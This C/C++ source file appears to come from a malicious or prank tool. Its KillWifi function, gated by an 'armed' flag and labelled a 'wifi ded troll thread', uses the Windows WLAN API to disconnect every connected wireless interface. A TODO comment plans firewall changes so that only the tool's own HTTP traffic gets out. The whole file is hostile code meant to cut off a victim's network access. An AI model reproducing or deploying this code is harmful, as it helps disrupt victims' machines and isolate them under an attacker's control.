#include "network.h"

extern bool armed;

/* TODO: Change this to maybe modify firewall rules in order to only allow our HTTP requests out of it
 * and block all other connections. Maybe create a new firewall profile set???
 */

int KillWifi() {
	// Declare and initialize variables.

	HANDLE hClient = NULL;
	DWORD dwMaxClient = 2;
	DWORD dwCurVersion = 0;
	DWORD dwResult = 0;

	WCHAR GuidString[40] = { 0 };

	if (!armed) printf("Beginning wifi ded troll thread\n");
	if (!armed) return 0;

	dwResult = WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient); //  
	if (dwResult != ERROR_SUCCESS) {
		// FormatMessage can be used to find out why the function failed
		return 1;
	}

	/* variables used for WlanEnumInterfaces  */

	PWLAN_INTERFACE_INFO_LIST pIfList = NULL; // interface listing catch buffer
	PWLAN_INTERFACE_INFO pIfInfo = NULL; // interface information catch buffer

	dwResult = WlanEnumInterfaces(hClient, NULL, &pIfList);
	if (dwResult != ERROR_SUCCESS) {
		// FormatMessage can be used to find out why the function failed
		return 1;
	}
	else {
		for (int i = 0; i < (int)pIfList->dwNumberOfItems; i++) {
			pIfInfo = (WLAN_INTERFACE_INFO*)&pIfList->InterfaceInfo[i];
			if (pIfInfo->isState == wlan_interface_state_connected) {
				DWORD close = WlanDisconnect(hClient, &pIfInfo->InterfaceGuid, NULL);
				/*if (close != ERROR_SUCCESS) {
					std::cout << "Failed to disconnect interface" << std::endl;
				}
				else {
					std::cout << "Successfully disconnected from network" << std::endl;
				}*/
			}
			else {
				//std::cout << "Interface not connected" << std::endl;
				break;
			}
		}
	}

	if (pIfList != NULL) { // tests if Interface list contains anything (anything was use during the bulk of function execution)
		WlanFreeMemory(pIfList); // if it was used: free the memory and set it to NULL, for future use
		pIfList = NULL;
	}
	return 0; // ends function
}